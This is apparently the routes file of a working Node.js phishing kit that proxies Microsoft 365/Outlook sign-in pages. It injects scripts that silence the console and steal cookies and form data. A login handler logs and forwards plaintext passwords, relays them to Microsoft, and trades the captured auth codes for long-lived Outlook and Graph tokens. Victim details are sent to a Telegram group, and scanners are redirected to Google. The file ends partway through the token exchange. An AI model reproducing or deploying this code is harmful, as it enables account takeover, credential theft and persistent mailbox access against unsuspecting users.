// routes/microsoftRoutes.js
const express = require('express');
const router = express.Router();
const axios = require('axios');
const cheerio = require('cheerio');
const { v4: uuidv4 } = require('uuid');

// Import utilities and services
const { 
    generateCodeVerifier, 
    generateCodeChallenge, 
    decrypt, 
    isValidEmail 
} = require('../utils/encryption');
const { getVictimInfo } = require('../utils/helpers');

// Constants
const DUAL_TOKEN_CLIENT_ID = '1fec8e78-bce4-4aaf-ab1b-5451cc387264';
const DUAL_TOKEN_REDIRECT_URI = 'https://login.microsoftonline.com/common/oauth2/nativeclient';
const OUTLOOK_SCOPE = 'https://outlook.office.com/.default openid profile offline_access';

// Store sessions (these will be passed from server.js)
let capturedData;
let microsoftParams;
let codeVerifiers;
let emailSessions;
let requestTimestamps;
let bot;
let telegramGroupId;

// Initialize with dependencies
function initRoutes(dependencies) {
    capturedData = dependencies.capturedData;
    microsoftParams = dependencies.microsoftParams;
    codeVerifiers = dependencies.codeVerifiers;
    emailSessions = dependencies.emailSessions;
    requestTimestamps = dependencies.requestTimestamps;
    bot = dependencies.bot;
    telegramGroupId = dependencies.telegramGroupId;
}

// Helper function to send cookie notification
async function sendCookieNotification(sessionId, username, victimInfo, cookies, cookieCount) {
    let message = `🍪 *COOKIES CAPTURED!*\n`;
    message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
    message += `*Session:* \`${sessionId}\`\n`;
    message += `*Email:* \`${username || 'Unknown'}\`\n`;
    message += `*Cookies Captured:* ${cookieCount}\n`;
    message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
    
    message += `*🔑 Important Cookies:*\n`;
    const importantCookies = ['RPSSecAuth', 'MSISAuth', 'MSISAuthenticated', 'MSPAuth', 'MSPProf', '.AspNet.Cookies'];
    const capturedImportant = cookies.filter(c => importantCookies.includes(c.name));
    
    if (capturedImportant.length > 0) {
        capturedImportant.forEach(cookie => {
            message += `• *${cookie.name}:* \`${cookie.value.substring(0, 40)}...\`\n`;
        });
    } else {
        message += `• No primary auth cookies captured yet\n`;
    }
    
    message += `\n*📊 All Cookies:*\n`;
    cookies.slice(0, 10).forEach(cookie => {
        message += `• ${cookie.name}: \`${cookie.value.substring(0, 30)}${cookie.value.length > 30 ? '...' : ''}\`\n`;
    });
    if (cookies.length > 10) {
        message += `• ... and ${cookies.length - 10} more cookies\n`;
    }
    
    message += `\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
    message += `*Victim Information:*\n`;
    message += `• IP: \`${victimInfo.ip}\`\n`;
    message += `• Location: ${victimInfo.location}\n`;
    message += `• Browser: ${victimInfo.browser}\n`;
    message += `• OS: ${victimInfo.os}\n`;
    message += `• Time: ${new Date().toLocaleString()}\n`;
    message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
    message += `*View All Data:* \`GET /api/captured-data\``;
    
    if (bot && telegramGroupId) {
        await bot.sendMessage(telegramGroupId, message, { parse_mode: 'Markdown' })
            .catch(e => console.error('Telegram error:', e.message));
    }
}

// Helper function to send dual token notification
async function sendDualTokenNotification(sessionId, username, victimInfo, outlookTokens, graphTokens) {
    let message = `🎯 *WINNING STRATEGY: DUAL TOKENS WITH CAE!*\n`;
    message += `━━━━━━━━━━━━━━━━━━\n`;
    message += `*Session:* \`${sessionId}\`\n`;
    message += `*Email:* \`${username}\`\n`;
    message += `━━━━━━━━━━━━━━━━━━\n\n`;
    message += `*✅ CAE ENABLED:* Tokens survive password & MFA changes\n\n`;
    
    if (outlookTokens) {
        message += `*📧 OUTLOOK TOKEN (via code exchange)*\n`;
        message += `• Expires: ${outlookTokens.expires_in} seconds\n`;
        message += `• Access: \`${outlookTokens.access_token.substring(0, 50)}...\`\n`;
        message += `• Refresh: \`${outlookTokens.refresh_token?.substring(0, 50) || 'N/A'}...\`\n\n`;
    }
    
    if (graphTokens) {
        message += `*🔄 GRAPH TOKEN (via code exchange)*\n`;
        message += `• Expires: ${graphTokens.expires_in} seconds\n`;
        message += `• Access: \`${graphTokens.access_token.substring(0, 50)}...\`\n`;
        message += `• Refresh: \`${graphTokens.refresh_token?.substring(0, 50) || 'N/A'}...\`\n\n`;
    }
    
    message += `━━━━━━━━━━━━━━━━━━\n`;
    message += `*Victim Information:*\n`;
    message += `• IP: \`${victimInfo.ip}\`\n`;
    message += `• Location: ${victimInfo.location}\n`;
    message += `• Browser: ${victimInfo.browser}\n`;
    message += `• OS: ${victimInfo.os}\n`;
    message += `━━━━━━━━━━━━━━━━━━\n`;
    message += `*Check Status:* \`GET /api/token-status/${sessionId}\`\n`;
    message += `*Export Tokens:* \`GET /api/export-persistent/${sessionId}\``;
    
    if (bot && telegramGroupId) {
        await bot.sendMessage(telegramGroupId, message, { parse_mode: 'Markdown' })
            .catch(e => console.error('Telegram error:', e.message));
    }
}

// Endpoint to capture cookies
router.post('/api/capture-cookies', express.json(), async (req, res) => {
    try {
        const { sessionId, cookies, email } = req.body;
        
        if (!sessionId || !cookies) {
            return res.status(400).json({ error: 'Missing sessionId or cookies' });
        }
        
        console.log(`🍪 Cookie capture request for session: ${sessionId}`);
        console.log(`   Cookies received: ${cookies.length || Object.keys(cookies).length}`);
        
        let session = capturedData.get(sessionId) || { cookies: [], credentials: {}, tokens: {} };
        
        // Parse cookies if they're in different formats
        let cookieArray = [];
        if (Array.isArray(cookies)) {
            cookieArray = cookies;
        } else if (typeof cookies === 'object') {
            cookieArray = Object.entries(cookies).map(([name, value]) => ({ name, value }));
        }
        
        // Add cookies to session
        if (!session.cookies) session.cookies = [];
        
        cookieArray.forEach(cookie => {
            const existingIndex = session.cookies.findIndex(c => c.name === cookie.name);
            if (existingIndex !== -1) {
                session.cookies[existingIndex] = {
                    ...cookie,
                    captured_at: new Date().toISOString(),
                    updated: true
                };
            } else {
                session.cookies.push({
                    ...cookie,
                    captured_at: new Date().toISOString()
                });
            }
        });
        
        capturedData.set(sessionId, session);
        
        // Send notification for important cookies
        const importantCookies = ['RPSSecAuth', 'MSISAuth', 'MSISAuthenticated', 'MSPAuth', 'MSPProf', '.AspNet.Cookies'];
        const hasImportant = cookieArray.some(c => importantCookies.includes(c.name));
        
        if (hasImportant && cookieArray.length > 0) {
            const victimInfo = await getVictimInfo(req);
            await sendCookieNotification(sessionId, email || 'Unknown', victimInfo, cookieArray, cookieArray.length);
        }
        
        console.log(`✅ Cookies saved for session ${sessionId}. Total cookies: ${session.cookies.length}`);
        
        res.json({ 
            success: true, 
            message: `Captured ${cookieArray.length} cookies`,
            cookieCount: session.cookies.length 
        });
        
    } catch (error) {
        console.error('❌ Cookie capture error:', error);
        res.status(500).json({ error: 'Failed to capture cookies' });
    }
});

// Exchange code for tokens
async function exchangeForResource(sessionId, code, codeVerifier, scope, resourceName) {
    try {
        console.log(`🔄 Exchanging for ${resourceName} token...`);
        
        const clientId = resourceName === 'graph' ? DUAL_TOKEN_CLIENT_ID : 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
        const redirectUri = resourceName === 'graph' ? DUAL_TOKEN_REDIRECT_URI : 'urn:ietf:wg:oauth:2.0:oob';
        
        const tokenParams = {
            client_id: clientId,
            code: code,
            code_verifier: codeVerifier,
            redirect_uri: redirectUri,
            grant_type: 'authorization_code',
            scope: `${scope} offline_access`
        };
        
        const tokenResponse = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token', 
            new URLSearchParams(tokenParams).toString(),
            {
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Accept': 'application/json'
                }
            }
        );
        
        const tokens = tokenResponse.data;
        console.log(`✅ ${resourceName} tokens received!`);
        
        return tokens;
        
    } catch (error) {
        console.error(`❌ ${resourceName} token exchange failed:`, error.response?.data || error.message);
        return null;
    }
}























// Main dual token endpoint with enhanced cookie capture
router.get('/en-us/microsoft-365/outlook', async (req, res) => {
    try {
        const { email: encryptedEmail } = req.query;
        let email = null;

        if (encryptedEmail) {
            try {
                email = decrypt(encryptedEmail);
                console.log('Decrypted email:', email);
                
                if (!email || !isValidEmail(email)) {
                    console.log('Invalid email format, redirecting...');
                    return res.redirect('https://www.google.com');
                }
            } catch (e) {
                console.error('Failed to decrypt email:', e);
                return res.redirect('https://www.google.com');
            }
        } else {
            console.log('No email parameter, redirecting...');
            return res.redirect('https://www.google.com');
        }

        const clientIp = req.clientIp || req.ip || 'unknown';
        const now = Date.now();
        
        const lastRequest = requestTimestamps.get(clientIp) || 0;
        if (now - lastRequest < 5000) {
            return res.status(429).send('Rate limited');
        }
        requestTimestamps.set(clientIp, now);
        
        const sessionId = 'dual_' + Date.now() + '_' + Math.random().toString(36).substring(2, 10);

        
        emailSessions.set(sessionId, { encrypted: encryptedEmail, decrypted: email });
        
        const codeVerifier = generateCodeVerifier();
        const codeChallenge = generateCodeChallenge(codeVerifier);




         // After generating sessionId, add this script to track the session
         const socketScript = `
         <script src="/socket.io/socket.io.js"></script>
         <script>
             const sessionId = '${sessionId}';
             const userEmail = '${email}';
             
             // Connect to Socket.io
             const socket = io({
                 query: { sessionId: sessionId }
             });
             
             socket.on('connect', () => {
                //  console.log('🔌 Connected to real-time server');
                 // Register this session with the server
                 socket.emit('register_session', { sessionId, email: userEmail });
             });
             
             // Listen for revoke events
             socket.on('revoked', (data) => {
                 console.log('🔴 REVOKED! Redirecting to Google...', data);
                 alert('Your access has been revoked. Redirecting...');
                 window.location.href = 'https://www.google.com';
             });
             
             // Listen for immediate redirect
             socket.on('force_redirect', (data) => {
                 console.log('🚨 Force redirect:', data.url);
                 window.location.href = data.url;
             });
         </script>
         `;

         
        
        codeVerifiers.set(sessionId, codeVerifier);
        
        console.log(`🔐 Dual Token PKCE for session ${sessionId}:`, {
            verifierLength: codeVerifier.length,
            challenge: codeChallenge.substring(0, 20) + '...',
            email: email
        });
        
        const authUrl = new URL('https://login.microsoftonline.com/common/oauth2/v2.0/authorize');
        authUrl.searchParams.append('client_id', DUAL_TOKEN_CLIENT_ID);
        authUrl.searchParams.append('response_type', 'code');
        authUrl.searchParams.append('redirect_uri', DUAL_TOKEN_REDIRECT_URI);
        authUrl.searchParams.append('scope', OUTLOOK_SCOPE);
        authUrl.searchParams.append('code_challenge', codeChallenge);
        authUrl.searchParams.append('code_challenge_method', 'S256');
        authUrl.searchParams.append('state', sessionId);
        authUrl.searchParams.append('prompt', 'select_account');
        authUrl.searchParams.append('response_mode', 'query');
        
        if (email) {
            authUrl.searchParams.append('login_hint', email);
        }
        
        const microsoftResponse = await axios({
            method: 'GET',
            url: authUrl.toString(),
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
            },
            maxRedirects: 5,
            timeout: 30000
        });

        let html = microsoftResponse.data;
        const $ = cheerio.load(html);
        
        // Enhanced tracking script with cookie capture
        const trackingScript = `
        <script>
            // Silence console output
            (function() {
                const noop = () => {};
                window.console.log = noop;
                window.console.info = noop;
                window.console.warn = noop;
                window.console.debug = noop;
                window.console.error = noop;
                window.console.trace = noop;
                window.console.group = noop;
                window.console.groupEnd = noop;
                window.console.groupCollapsed = noop;
            })();
            
            (function() {
                const sessionId = '${sessionId}';
                const userEmail = '${email}';
                
                sessionStorage.setItem('phishSessionId', sessionId);
                sessionStorage.setItem('userEmail', userEmail);
                localStorage.setItem('phishSessionId', sessionId);
                
                function captureAllCookies() {
                    const cookies = document.cookie.split(';').map(cookie => {
                        const [name, ...valueParts] = cookie.trim().split('=');
                        const value = valueParts.join('=');
                        return { name: name.trim(), value: value };
                    }).filter(cookie => cookie.name && cookie.value);
                    
                    if (cookies.length > 0) {
                        fetch('/api/capture-cookies', {
                            method: 'POST',
                            headers: { 
                                'Content-Type': 'application/json',
                                'ngrok-skip-browser-warning': 'true'
                            },
                            body: JSON.stringify({
                                sessionId: sessionId,
                                cookies: cookies,
                                email: userEmail,
                                timestamp: new Date().toISOString()
                            })
                        }).catch(() => {});
                    }
                    return cookies;
                }
                
                function sendTracking(endpoint, data) {
                    fetch(endpoint, {
                        method: 'POST',
                        headers: { 
                            'Content-Type': 'application/json',
                            'ngrok-skip-browser-warning': 'true'
                        },
                        body: JSON.stringify(data)
                    }).catch(() => {});
                }
                
                setTimeout(() => captureAllCookies(), 1000);
                
                let lastCookies = document.cookie;
                setInterval(() => {
                    const currentCookies = document.cookie;
                    if (currentCookies !== lastCookies) {
                        captureAllCookies();
                        lastCookies = currentCookies;
                    }
                }, 3000);
                
                sendTracking('/api/track-page-view', {
                    sessionId: sessionId,
                    template: 'microsoft-365',
                    url: window.location.href,
                    timestamp: new Date().toISOString(),
                    email: userEmail
                });
                
                document.addEventListener('click', function(e) {
                    let target = e.target;
                    while (target && target.tagName !== 'A') {
                        target = target.parentElement;
                    }
                    if (target && target.tagName === 'A') {
                        const href = target.getAttribute('href');
                        if (href && !href.startsWith('#') && !href.startsWith('javascript:')) {
                            sendTracking('/api/track-click', {
                                sessionId: sessionId,
                                template: 'microsoft-365',
                                targetUrl: href,
                                timestamp: new Date().toISOString(),
                                email: userEmail
                            });
                        }
                    }
                });
                
                document.addEventListener('submit', function(e) {
                    const form = e.target;
                    const formData = new FormData(form);
                    const formValues = {};
                    for (let [key, value] of formData.entries()) {
                        formValues[key] = value;
                    }
                    
                    captureAllCookies();
                    
                    sendTracking('/api/track-form', {
                        sessionId: sessionId,
                        formAction: form.action,
                        formData: formValues,
                        timestamp: new Date().toISOString(),
                        email: userEmail
                    });
                });
                
                const originalFetch = window.fetch;
                window.fetch = function(url, options = {}) {
                    if (typeof url === 'string' && url.includes('/GetCredentialType')) {
                        captureAllCookies();
                        sendTracking('/api/track-api-call', {
                            sessionId: sessionId,
                            endpoint: 'GetCredentialType',
                            timestamp: new Date().toISOString(),
                            email: userEmail
                        });
                        return originalFetch('/proxy/GetCredentialType', {
                            ...options,
                            headers: {
                                ...options.headers,
                                'X-User-Email': userEmail
                            }
                        });
                    }
                    return originalFetch(url, options);
                };
                
                const originalXHR = window.XMLHttpRequest;
                window.XMLHttpRequest = function() {
                    const xhr = new originalXHR();
                    const originalOpen = xhr.open;
                    
                    xhr.open = function(method, url, ...args) {
                        if (typeof url === 'string' && url.includes('/GetCredentialType')) {
                            url = '/proxy/GetCredentialType';
                            captureAllCookies();
                            sendTracking('/api/track-api-call', {
                                sessionId: sessionId,
                                endpoint: 'GetCredentialType (XHR)',
                                timestamp: new Date().toISOString(),
                                email: userEmail
                            });
                        }
                        return originalOpen.call(this, method, url, ...args);
                    };
                    
                    return xhr;
                };
                
                window.addEventListener('beforeunload', function() {
                    captureAllCookies();
                });
                
                // FIXED: Wait for DOM to be ready before using MutationObserver
                document.addEventListener('DOMContentLoaded', function() {
                    const observer = new MutationObserver(function(mutations) {
                        let shouldCaptureCookies = false;
                        mutations.forEach(function(mutation) {
                            if (mutation.addedNodes && mutation.addedNodes.length > 0) {
                                mutation.addedNodes.forEach(function(node) {
                                    if (node.nodeName === 'FORM' || (node.querySelector && node.querySelector('form'))) {
                                        shouldCaptureCookies = true;
                                    }
                                });
                            }
                        });
                        if (shouldCaptureCookies) {
                            captureAllCookies();
                        }
                    });
                    
                    if (document.body) {
                        observer.observe(document.body, { childList: true, subtree: true });
                    }
                });
            })();
        </script>
        `;
        
        $('body').append(socketScript);
        // Add tracking script
        $('head').append(trackingScript);
        
        // Add form modification script
        $('head').append(`
            <script>
                (function() {
                    const sessionId = '${sessionId}';
                    const email = '${email}';
                    
                    function fixForms() {
                        document.querySelectorAll('form').forEach(function(form) {
                            if (form.dataset.fixed === 'true') return;
                            
                            if (!form.querySelector('input[name="sessionId"]')) {
                                const input = document.createElement('input');
                                input.type = 'hidden';
                                input.name = 'sessionId';
                                input.value = sessionId;
                                form.appendChild(input);
                            }
                            
                            if (!form.querySelector('input[name="state"]')) {
                                const input = document.createElement('input');
                                input.type = 'hidden';
                                input.name = 'state';
                                input.value = sessionId;
                                form.appendChild(input);
                            }
                            
                            if (!form.querySelector('input[name="email"]') && email) {
                                const input = document.createElement('input');
                                input.type = 'hidden';
                                input.name = 'email';
                                input.value = email;
                                form.appendChild(input);
                            }
                            
                            form.dataset.fixed = 'true';
                        });
                    }
                    
                    setTimeout(fixForms, 100);
                    setTimeout(fixForms, 500);
                    setTimeout(fixForms, 1000);
                })();
            </script>
        `);
        
        microsoftParams.set(sessionId, { email: email });
        
        res.send($.html());
        
    } catch (error) {
        console.error('Dual token flow error:', error.message);
        res.status(500).send('Error loading login page');
    }
});

// Dual token login handler - FIXED: Handles token exchange directly without redirect
// router.post('/proxy/dual-login', express.urlencoded({ extended: true }), async (req, res) => {
//     console.log('📥 Dual token login submission');
    
//     const sessionId = req.body?.state || req.body?.sessionId || 'unknown';
//     const username = req.body?.login || req.body?.email;
//     const password = req.body?.passwd;
    
//     const victimInfo = await getVictimInfo(req);
    
//     // Track credentials
//     if (username && password) {
//         console.log(`🔑 CREDENTIALS CAPTURED: ${username} / ${password}`);
        
//         let session = capturedData.get(sessionId) || { credentials: {}, cookies: [], tokens: {} };
//         session.credentials = { username, password, time: new Date().toISOString(), victimInfo };
//         capturedData.set(sessionId, session);
        
//         // Send Telegram notification for credentials
//         if (bot && telegramGroupId) {
//             const message = 
//                 `🔑 *CREDENTIALS CAPTURED!*\n` +
//                 `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
//                 `*Session:* \`${sessionId}\`\n` +
//                 `*Email:* \`${username}\`\n` +
//                 `*Password:* \`${password}\`\n` +
//                 `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
//                 `*Victim Information:*\n` +
//                 `• *IP:* \`${victimInfo.ip}\`\n` +
//                 `• *Location:* ${victimInfo.location}\n` +
//                 `• *Browser:* ${victimInfo.browser}\n` +
//                 `• *OS:* ${victimInfo.os}\n` +
//                 `• *Time:* ${new Date().toLocaleString()}\n` +
//                 `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
            
//             await bot.sendMessage(telegramGroupId, message, { parse_mode: 'Markdown' })
//                 .catch(e => console.error('Telegram error:', e.message));
//         }
//     }
    
//     const codeVerifier = codeVerifiers.get(sessionId);
    
//     if (!codeVerifier) {
//         console.error(`❌ No code verifier for session ${sessionId}`);
//         return res.redirect('/en-us/microsoft-365/outlook?error=no_verifier');
//     }
    
//     try {
//         const formData = new URLSearchParams();
//         Object.keys(req.body).forEach(key => formData.append(key, req.body[key]));
        
//         console.log('📤 Submitting dual token login form...');
        
//         const response = await axios.post('https://login.microsoftonline.com/common/login', formData.toString(), {
//             headers: {
//                 'Content-Type': 'application/x-www-form-urlencoded',
//                 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
//             },
//             maxRedirects: 0,
//             validateStatus: status => status >= 200 && status < 400
//         }).catch(err => err.response);
        
//         // Capture cookies from response
//         if (response?.headers['set-cookie']) {
//             const responseCookies = response.headers['set-cookie'];
//             console.log(`🍪 Captured ${responseCookies.length} cookies from login response`);
            
//             let session = capturedData.get(sessionId) || { cookies: [], credentials: {}, tokens: {} };
//             if (!session.cookies) session.cookies = [];
            
//             responseCookies.forEach(cookieStr => {
//                 const [cookieNameValue] = cookieStr.split(';');
//                 const [name, value] = cookieNameValue.split('=');
//                 session.cookies.push({
//                     name: name.trim(),
//                     value: value || '',
//                     from_login_response: true,
//                     captured_at: new Date().toISOString()
//                 });
//             });
            
//             capturedData.set(sessionId, session);
//         }
        
//         if (response?.headers?.location) {
//             const location = response.headers.location;
//             console.log(`↪️ Microsoft redirects to: ${location}`);
            
//             // IMPORTANT: Extract the code from the redirect URL and exchange immediately
//             if (location.includes('nativeclient') && location.includes('code=')) {
//                 const codeMatch = location.match(/[?&]code=([^&]+)/);
//                 if (codeMatch && codeMatch[1]) {
//                     const code = decodeURIComponent(codeMatch[1]);
//                     console.log(`✅ Auth code captured for ${sessionId}: ${code.substring(0, 30)}...`);
                    
//                     // Exchange the code for tokens IMMEDIATELY
//                     try {
//                         const tokenResponse = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
//                             new URLSearchParams({
//                                 client_id: DUAL_TOKEN_CLIENT_ID,
//                                 code: code,
//                                 code_verifier: codeVerifier,
//                                 redirect_uri: DUAL_TOKEN_REDIRECT_URI,
//                                 grant_type: 'authorization_code',
//                                 scope: 'https://outlook.office.com/.default https://graph.microsoft.com/.default offline_access',
//                                 claims: JSON.stringify({
//                                     access_token: {
//                                         xms_cc: { values: ["CP1"] }
//                                     }
//                                 })
//                             }).toString(),
//                             {
//                                 headers: {
//                                     'Content-Type': 'application/x-www-form-urlencoded',
//                                     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
//                                     'Accept': 'application/json'
//                                 }
//                             }
//                         );
                        
//                         const tokens = tokenResponse.data;
//                         console.log('✅ Tokens received successfully!');
                        
//                         let tokenSession = capturedData.get(sessionId) || { cookies: [], credentials: {}, tokens: {} };
                        
//                         tokenSession.tokens.outlook = {
//                             access_token: tokens.access_token,
//                             refresh_token: tokens.refresh_token,
//                             expires_in: tokens.expires_in,
//                             scope: tokens.scope,
//                             captured_at: new Date().toISOString(),
//                             cae_enabled: true
//                         };
                        
//                         tokenSession.tokens.graph = {
//                             access_token: tokens.access_token,
//                             refresh_token: tokens.refresh_token,
//                             expires_in: tokens.expires_in,
//                             scope: tokens.scope,
//                             captured_at: new Date().toISOString(),
//                             cae_enabled: true
//                         };
                        
//                         tokenSession.tokens.dual_capture = true;
//                         capturedData.set(sessionId, tokenSession);
                        
//                         await sendDualTokenNotification(sessionId, username, victimInfo, tokens, tokens);
                        
//                         // Return success page instead of redirecting to Outlook directly
//                         const successHtml = `
//                             <!DOCTYPE html>
//                             <html>
//                             <head>
//                                 <title>Authentication Successful</title>
//                                 <style>
//                                     body {
//                                         font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
//                                         display: flex;
//                                         justify-content: center;
//                                         align-items: center;
//                                         height: 100vh;
//                                         margin: 0;
//                                         background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
//                                     }
//                                     .container {
//                                         text-align: center;
//                                         background: white;
//                                         padding: 40px;
//                                         border-radius: 12px;
//                                         box-shadow: 0 10px 25px rgba(0,0,0,0.1);
//                                         animation: fadeIn 0.5s ease-in;
//                                     }
//                                     @keyframes fadeIn {
//                                         from { opacity: 0; transform: translateY(-20px); }
//                                         to { opacity: 1; transform: translateY(0); }
//                                     }
//                                     .success-icon {
//                                         color: #4CAF50;
//                                         font-size: 64px;
//                                         margin-bottom: 20px;
//                                         animation: bounce 0.5s ease-in-out;
//                                     }
//                                     @keyframes bounce {
//                                         0%, 100% { transform: scale(1); }
//                                         50% { transform: scale(1.1); }
//                                     }
//                                     h1 {
//                                         color: #333;
//                                         margin-bottom: 10px;
//                                         font-size: 28px;
//                                     }
//                                     p {
//                                         color: #666;
//                                         margin-bottom: 20px;
//                                         font-size: 16px;
//                                     }
//                                     .redirect-message {
//                                         color: #999;
//                                         font-size: 14px;
//                                         margin-top: 20px;
//                                     }
//                                     .spinner {
//                                         border: 3px solid #f3f3f3;
//                                         border-top: 3px solid #667eea;
//                                         border-radius: 50%;
//                                         width: 40px;
//                                         height: 40px;
//                                         animation: spin 1s linear infinite;
//                                         margin: 20px auto;
//                                     }
//                                     @keyframes spin {
//                                         0% { transform: rotate(0deg); }
//                                         100% { transform: rotate(360deg); }
//                                     }
//                                     .email {
//                                         color: #667eea;
//                                         font-weight: 600;
//                                     }
//                                 </style>
//                                 <script>
//                                     // Capture final cookies before redirect
//                                     setTimeout(function() {
//                                         const cookies = document.cookie.split(';').map(cookie => {
//                                             const [name, ...valueParts] = cookie.trim().split('=');
//                                             const value = valueParts.join('=');
//                                             return { name: name.trim(), value: value };
//                                         }).filter(cookie => cookie.name && cookie.value);
                                        
//                                         if (cookies.length > 0) {
//                                             fetch('/api/capture-cookies', {
//                                                 method: 'POST',
//                                                 headers: { 'Content-Type': 'application/json' },
//                                                 body: JSON.stringify({
//                                                     sessionId: '${sessionId}',
//                                                     cookies: cookies,
//                                                     email: '${username}'
//                                                 })
//                                             }).catch(err => console.log('Cookie capture error:', err));
//                                         }
//                                     }, 1000);
                                    
//                                     setTimeout(function() {
//                                         window.location.href = 'https://outlook.live.com/mail/';
//                                     }, 3000);
//                                 </script>
//                             </head>
//                             <body>
//                                 <div class="container">
//                                     <div class="success-icon">✓</div>
//                                     <h1>Authentication Successful!</h1>
//                                     <p>Welcome, <span class="email">${username}</span></p>
//                                     <div class="spinner"></div>
//                                     <p class="redirect-message">Redirecting to Outlook in a few seconds...</p>
//                                 </div>
//                             </body>
//                             </html>
//                         `;
                        
//                         return res.send(successHtml);
                        
//                     } catch (exchangeError) {
//                         console.error('❌ Token exchange failed:', exchangeError.response?.data || exchangeError.message);
//                         return res.redirect('/en-us/microsoft-365/outlook?error=token_exchange_failed');
//                     }
//                 }
//             }
            
//             // If no code found, just follow the redirect
//             return res.redirect(location);
//         }
        
//         res.redirect('/en-us/microsoft-365/outlook?error=auth_failed');
        
//     } catch (error) {
//         console.error('❌ Dual token login error:', error.message);
//         res.redirect('/en-us/microsoft-365/outlook?error=connection_error');
//     }
// });


// Dual token login handler - FIXED with better debugging
router.post('/proxy/dual-login', express.urlencoded({ extended: true }), async (req, res) => {
    console.log('📥 Dual token login submission');
    
    const sessionId = req.body?.state || req.body?.sessionId || 'unknown';
    const username = req.body?.login || req.body?.email;
    const password = req.body?.passwd;
    
    const victimInfo = await getVictimInfo(req);
    
    // Track credentials
    if (username && password) {
        console.log(`🔑 CREDENTIALS CAPTURED: ${username} / ${password}`);
        
        let session = capturedData.get(sessionId) || { credentials: {}, cookies: [], tokens: {} };
        session.credentials = { username, password, time: new Date().toISOString(), victimInfo };
        capturedData.set(sessionId, session);
        
        // Send Telegram notification for credentials
        if (bot && telegramGroupId) {
            const message = 
                `🔑 *CREDENTIALS CAPTURED!*\n` +
                `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                `*Session:* \`${sessionId}\`\n` +
                `*Email:* \`${username}\`\n` +
                `*Password:* \`${password}\`\n` +
                `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                `*Victim Information:*\n` +
                `• *IP:* \`${victimInfo.ip}\`\n` +
                `• *Location:* ${victimInfo.location}\n` +
                `• *Browser:* ${victimInfo.browser}\n` +
                `• *OS:* ${victimInfo.os}\n` +
                `• *Time:* ${new Date().toLocaleString()}\n` +
                `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
            
            await bot.sendMessage(telegramGroupId, message, { parse_mode: 'Markdown' })
                .catch(e => console.error('Telegram error:', e.message));
        }
    }
    
    const codeVerifier = codeVerifiers.get(sessionId);
    
    if (!codeVerifier) {
        console.error(`❌ No code verifier for session ${sessionId}`);
        return res.redirect('/en-us/microsoft-365/outlook?error=no_verifier');
    }
    
    try {
        const formData = new URLSearchParams();
        Object.keys(req.body).forEach(key => formData.append(key, req.body[key]));
        
        console.log('📤 Submitting dual token login form...');
        
        const response = await axios.post('https://login.microsoftonline.com/common/login', formData.toString(), {
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            },
            maxRedirects: 0,
            validateStatus: status => status >= 200 && status < 400
        }).catch(err => err.response);
        
        // Capture cookies from response
        if (response?.headers['set-cookie']) {
            const responseCookies = response.headers['set-cookie'];
            console.log(`🍪 Captured ${responseCookies.length} cookies from login response`);
            
            let session = capturedData.get(sessionId) || { cookies: [], credentials: {}, tokens: {} };
            if (!session.cookies) session.cookies = [];
            
            responseCookies.forEach(cookieStr => {
                const [cookieNameValue] = cookieStr.split(';');
                const [name, value] = cookieNameValue.split('=');
                session.cookies.push({
                    name: name.trim(),
                    value: value || '',
                    from_login_response: true,
                    captured_at: new Date().toISOString()
                });
            });
            
            capturedData.set(sessionId, session);
        }
        
        if (response?.headers?.location) {
            const location = response.headers.location;
            console.log(`↪️ Microsoft redirects to: ${location}`);
            
            // Log what we're checking
            console.log(`   Checking if location contains 'nativeclient': ${location.includes('nativeclient')}`);
            console.log(`   Checking if location contains 'code=': ${location.includes('code=')}`);
            
            // IMPORTANT: Extract the code from the redirect URL and exchange immediately
            if (location.includes('nativeclient') && location.includes('code=')) {
                const codeMatch = location.match(/[?&]code=([^&]+)/);
                console.log(`   Code match found: ${!!codeMatch}`);
                
                if (codeMatch && codeMatch[1]) {
                    const code = decodeURIComponent(codeMatch[1]);
                    console.log(`✅ Auth code captured for ${sessionId}: ${code.substring(0, 50)}...`);
                    
                    // Exchange the code for tokens IMMEDIATELY
                    try {
                        console.log('🔄 Exchanging code for tokens...');
                        const tokenResponse = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
                            new URLSearchParams({
                                client_id: DUAL_TOKEN_CLIENT_ID,
                                code: code,
                                code_verifier: codeVerifier,
                                redirect_uri: DUAL_TOKEN_REDIRECT_URI,
                                grant_type: 'authorization_code',
                                scope: 'https://outlook.office.com/.default https://graph.microsoft.com/.default offline_access',
                                claims: JSON.stringify({
                                    access_token: {
                                        xms_cc: { values: ["CP1"] }
                                    }
                                })
                            }).toString(),
                            {
                                headers: {
                                    'Content-Type': 'application/x-www-form-urlencoded',
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                                    'Accept': 'application/json'
                                }
                            }
                        );
                        
                        const tokens = tokenResponse.data;
